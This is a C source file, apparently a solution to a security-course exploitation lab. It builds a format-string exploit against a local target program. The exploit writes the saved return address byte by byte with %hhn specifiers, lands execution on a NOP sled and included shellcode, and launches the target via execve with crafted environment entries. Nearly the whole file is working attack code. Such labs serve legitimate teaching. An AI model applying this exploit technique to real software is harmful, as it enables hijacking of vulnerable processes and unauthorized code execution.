#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
    char *args[3];
    char *env[25];

    uint8_t input[217];
    uint8_t format_string[159];

    memset(input, 0x90, sizeof(input));

    uint64_t *addresses = (uint64_t *) input;

    addresses[0] = 0x0000000040a4fea8;
    addresses[1] = 0x0101010101010101;
    addresses[2] = 0x0000000040a4fea9;
    addresses[3] = 0x0101010101010101;
    addresses[4] = 0x0000000040a4feaa;
    addresses[5] = 0x0101010101010101;
    addresses[6] = 0x0000000040a4feab;

    // printf("%p\n", input + sizeof(input) - sizeof(shellcode)); 
    // printf("%p\n", input);

    strcpy(format_string, "%34llx%1llx%1llx%hhn%215llx%hhn%168llx%hhn%156llx%hhn\n");
    memcpy(input + 58, format_string, strlen(format_string) - 1);
    memcpy(input + sizeof(input) - sizeof(shellcode), shellcode, sizeof(shellcode));

    args[0] = TARGET; 
    args[1] = input;
    args[2] = NULL;

    env[0]  = (char *) &input[5];
    env[1]  = (char *) &input[6];
    env[2]  = (char *) &input[7];
    env[3]  = (char *) &input[8];
    env[4]  = (char *) &input[21];
    env[5]  = (char *) &input[22];
    env[6]  = (char *) &input[23];
    env[7]  = (char *) &input[24];
    env[8]  = (char *) &input[37];
    env[9]  = (char *) &input[38];
    env[10] = (char *) &input[39];
    env[11] = (char *) &input[40];
    env[12] = (char *) &input[53];
    env[13] = (char *) &input[54];
    env[14] = (char *) &input[55];
    env[15] = (char *) &input[56];
    env[16] = NULL;

    // rip: 0x40a4fea8 (address of return address)
    // buf: 0x40a4fc70
    // address of shellcode in formatString: 0x40a4fc25

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
